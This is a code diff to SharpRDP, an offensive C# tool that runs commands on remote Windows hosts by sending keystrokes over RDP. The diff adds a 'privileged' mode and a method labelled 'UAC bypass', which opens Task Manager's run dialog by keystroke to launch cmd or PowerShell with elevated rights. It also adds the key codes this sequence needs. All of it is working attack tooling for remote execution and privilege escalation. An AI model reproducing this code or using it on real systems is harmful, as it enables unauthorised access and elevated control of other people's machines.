@@ -18,6 +18,7 @@ namespace SharpRDP
         private string cmd;
         private string execwith;
         private string target;
+        private bool privileged_context;
         private enum Logonerrors : uint
         {
             ARBITRATION_CODE_BUMP_OPTIONS = 0xFFFFFFFB,
@@ -36,13 +37,14 @@ namespace SharpRDP
             STATUS_PASSWORD_MUST_CHANGE = 0xC0000224
         }
 
-        public void CreateRdpConnection(string server, string user, string domain, string password, string command, string execw)
+        public void CreateRdpConnection(string server, string user, string domain, string password, string command, string execw, bool privileged)
         {
             keycode = new Dictionary<String, Code>();
             KeyCodes();
             cmd = command;
             target = server;
             execwith = execw;
+            privileged_context = privileged;
 
             void ProcessTaskThread()
             {
@@ -107,11 +109,44 @@ namespace SharpRDP
             var errorstatus = Enum.GetName(typeof(Logonerrors), (uint)LogonErrorCode);
             Console.WriteLine("[-] Logon Error    :  {0} - {1}", LogonErrorCode, errorstatus);
             Thread.Sleep(2000);
-            if(LogonErrorCode != -2)
+            if (LogonErrorCode != -2)
             {
                 Environment.Exit(0);
             }
-            
+
+        }
+        private void RdpPrivilegeCmd(string shell)
+        {
+            Console.WriteLine("[+] UAC bypass");
+            Thread.Sleep(500);
+            SendText("taskmgr");
+            Thread.Sleep(1000);
+
+            Thread.Sleep(500);
+            SendElement("Enter+down");
+            Thread.Sleep(500);
+            SendElement("Enter+up");
+
+            SendElement("Alt+F");
+            Thread.Sleep(1000);
+
+            SendElement("Enter+down");
+            Thread.Sleep(500);
+            SendElement("Enter+up");
+
+            Thread.Sleep(500);
+            SendText(shell);
+
+            Thread.Sleep(500);
+            SendElement("Tab");
+
+            Thread.Sleep(500);
+            SendText(" ");
+
+            Thread.Sleep(500);
+            SendElement("Enter+down");
+            Thread.Sleep(500);
+            SendElement("Enter+up");
         }
         private void RdpConnectionOnOnLoginComplete(object sender, EventArgs e)
         {
@@ -136,13 +171,17 @@ namespace SharpRDP
             if (execwith == "cmd")
             {
                 Console.WriteLine("[+] Executing {0} from cmd.exe", cmd.ToLower());
-                SendText("cmd.exe");
+                SendText("cmd");
                 Thread.Sleep(1000);
 
                 SendElement(enterdown);
                 Thread.Sleep(500);
                 SendElement(enterup);
 
+                if (privileged_context == true)
+                {
+                    RdpPrivilegeCmd("cmd");
+                }
                 Thread.Sleep(500);
                 SendText(cmd.ToLower());
 
@@ -154,6 +193,7 @@ namespace SharpRDP
 
                 Thread.Sleep(500);
                 SendText("exit");
+
             }
             else if (execwith == "powershell" || execwith == "ps")
             {
@@ -164,6 +204,11 @@ namespace SharpRDP
                 SendElement(enterdown);
                 Thread.Sleep(500);
                 SendElement(enterup);
+
+                if (privileged_context == true)
+                {
+                    RdpPrivilegeCmd("powershell");
+                }
 
                 Thread.Sleep(500);
                 SendText(cmd.ToLower());
@@ -227,6 +272,9 @@ namespace SharpRDP
             keycode["Down"] = new Code(new[] { false, true }, new[] { 0x150 });
             keycode["Right"] = new Code(new[] { false, true }, new[] { 0x14d });
             keycode["Left"] = new Code(new[] { false, true }, new[] { 0x14b });
+            keycode["Alt"] = new Code(new[] { false, true }, new[] { 0x38 });
+            keycode["Shift"] = new Code(new[] { false, true }, new[] { 0x2a });
+            keycode["Tab"] = new Code(new[] { false, true }, new[] { 0x0f });
 
             keycode["Calc"] = new Code(new[] { false, true }, new[] { 0x121, 0x121 });
             keycode["Paste"] = new Code(new[] { false, true }, new[] { 0x10a, 0x10a });
@@ -296,6 +344,7 @@ namespace SharpRDP
             keycode["Ctrl+Shift"] = new Code(new[] { false, false, true, true }, new[] { 0x1d, 0x2a });
             keycode["Alt+F4"] = new Code(new[] { false, false, true, true }, new[] { 0x38, 0x3e });
             keycode["Ctrl+V"] = new Code(new[] { false, false, true, true }, new[] { 0x1d, 0x2f });
+            keycode["Alt+F"] = new Code(new[] { false, false, true, true }, new[] { 0x38, 0x21 });
         }
     }
 }
